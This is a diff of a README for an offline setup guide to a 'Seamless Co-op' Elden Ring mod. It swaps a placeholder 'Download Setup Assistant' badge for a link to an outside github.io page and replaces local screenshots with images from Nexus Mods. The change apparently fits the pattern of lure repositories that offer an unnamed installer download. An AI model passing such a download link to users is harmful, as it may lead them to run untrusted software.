@@ -1,6 +1,6 @@
 # Seamless Co-op Nightreign — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://seamless-coop-nightreign-setup-guide.github.io/.github)
 
 A full offline installation manual for **Seamless Co-op Nightreign**, a mod for *Elden Ring* that unlocks LAN-based multiplayer without needing an online connection.
 
@@ -43,16 +43,10 @@ A full offline installation manual for **Seamless Co-op Nightreign**, a mod for 
 
 > ⚠️ Screenshots below are taken from actual offline sessions using the Seamless Co-op Nightreign setup.
 
-![Lobby Menu](assets/preview_lobby_menu.jpg)  
-*In-game lobby screen with full co-op options enabled*
-
-![LAN Session](assets/preview_lan_game.jpg)  
+![LAN Session](https://staticdelivery.nexusmods.com/mods/7800/images/3/3-1749401969-963153618.jpeg)  
 *Two players exploring the Lands Between without online servers*
 
-![World Save](assets/preview_world_progress.jpg)  
-*Progress is persistent even in offline mode*
-
-![Settings UI](assets/preview_mod_ui.jpg)  
+![Settings UI](https://staticdelivery.nexusmods.com/mods/7800/images/3/3-1748628595-1811355229.png)  
 *Fully unlocked mod UI inside the game*
 
 ---
